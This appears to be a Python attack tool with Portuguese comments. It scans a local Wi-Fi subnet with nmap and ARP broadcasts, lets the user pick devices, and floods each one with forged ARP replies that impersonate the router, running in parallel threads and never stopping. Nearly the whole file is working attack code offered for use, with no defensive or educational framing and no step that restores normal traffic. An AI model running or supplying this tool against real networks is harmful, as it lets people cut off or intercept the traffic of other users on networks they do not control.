import time
import psutil
import subprocess
from scapy.all import ARP, Ether, srp, sendp, conf
import nmap
import threading
import os

os.system('cls')
GREEN = "\033[92m"
RESET = "\033[0m"

banner = """


                   .´  ·  .     .  ·  `.
                   :  :  :  (¯)  :  :  :
                   `.  ·  ` /¯\ ´  ·  .´
                     `     /¯¯¯\     ´  
                          /-----\       
                         
                 
                  
"""

print(GREEN + banner + RESET)



def detect_default_interface():
    interfaces = psutil.net_if_addrs()
    for iface_name, iface_addresses in interfaces.items():
        for addr in iface_addresses:
            if addr.family == psutil.AF_LINK: 
                if "Wi-Fi" in iface_name or "Wireless" in iface_name or "wlan" in iface_name.lower():
                    return iface_name
    return None

def scan_network_with_nmap(target_ip_range):
    """
    Escaneia a rede usando Nmap.
    """
    print("Scanning the network with exploit, please wait...")
    nm = nmap.PortScanner()
    nm.scan(hosts=target_ip_range, arguments='-sn')  # Escaneia apenas para hosts (não portas)
    
    devices = []
    for host in nm.all_hosts():
        if 'hostnames' in nm[host]:
            devices.append({'ip': host, 'mac': nm[host].get('addresses', {}).get('mac', 'Desconhecido')})
        else:
            devices.append({'ip': host, 'mac': 'Desconhecido'})
    return devices

def scan_network_with_arp(target_ip_range, interface):
    """
    Escaneia a rede usando ARP para encontrar dispositivos conectados.
    """
    print("Scanning the network with ARP, please wait...")
    arp_request = ARP(pdst=target_ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, iface=interface, timeout=2, verbose=False)[0]

    devices = []
    for element in answered_list:
        devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
    return devices

def arp_spoof(target_ip, target_mac, router_ip, interface):
    """
    Realiza ataque ARP Spoofing contra o dispositivo alvo.
    """
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
    packet = Ether(dst=target_mac) / arp_response

    print(f"Starting ARP Spoofing attack against {target_ip} ({target_mac})...")
    try:
        while True:
            sendp(packet, iface=interface, verbose=False, count=50)  # Aumenta a quantidade de pacotes por vez
            time.sleep(0.05)  # Reduz o intervalo entre pacotes para 50ms
    except KeyboardInterrupt:
        print("\nAtaque ARP interrompido.")

def attack_device(device, router_ip, interface):
    """
    Função que realiza o ataque ARP para um dispositivo específico.
    """
    print(f"Starting ARP attack against {device['ip']} ({device['mac']})...")
    arp_spoof(device['ip'], device['mac'], router_ip, interface)

def attack_multiple_devices(devices_to_attack, router_ip, interface):
    """
    Inicia o ataque ARP Spoofing para múltiplos dispositivos simultaneamente.
    """
    threads = []
    
    # Criar uma thread para cada dispositivo a ser atacado
    for device in devices_to_attack:
        thread = threading.Thread(target=attack_device, args=(device, router_ip, interface))
        threads.append(thread)
        thread.start()

    # Aguardar o término de todas as threads
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # Detecta a interface padrão
    interface = detect_default_interface()
    if not interface:
        print("Unable to detect a Wi-Fi interface automatically. Make sure there is an active interface.")
        exit()

    print(f"Interface detectada: {interface}")

    # Configuração da rede
    target_ip_range = "192.168.1.1/24"  # Ajuste conforme necessário
    router_ip = "192.168.1.1"  # IP do roteador, ajuste se necessário

    # Escaneia a rede usando Nmap e ARP
    devices_nmap = scan_network_with_nmap(target_ip_range)
    devices_arp = scan_network_with_arp(target_ip_range, interface)

    # Combina os resultados para garantir que nenhum dispositivo seja perdido
    all_devices = {device['ip']: device for device in devices_nmap + devices_arp}
    all_devices = list(all_devices.values())

    print("\nDevices found:")
    for index, device in enumerate(all_devices):
        print(f"{index + 1}. IP: {device['ip']}, MAC: {device['mac']}")

    # Seleção de múltiplos dispositivos para ataque
    selected_devices = input("\nSelect devices to attack (example: 1,3,5): ")
    selected_devices = selected_devices.split(',')

    devices_to_attack = []
    for index in selected_devices:
        try:
            device_index = int(index.strip()) - 1
            if device_index < 0 or device_index >= len(all_devices):
                print(f"Device {index} is not valid. Jumping...")
            else:
                devices_to_attack.append(all_devices[device_index])
        except ValueError:
            print(f"{index} is not a valid number.")

    if not devices_to_attack:
        print("No valid devices selected.")
        exit()

    # Inicia o ataque ARP Spoofing para todos os dispositivos selecionados simultaneamente
    print("\nStarting ARP Spoofing attack on selected devices...")
    attack_multiple_devices(devices_to_attack, router_ip, interface)
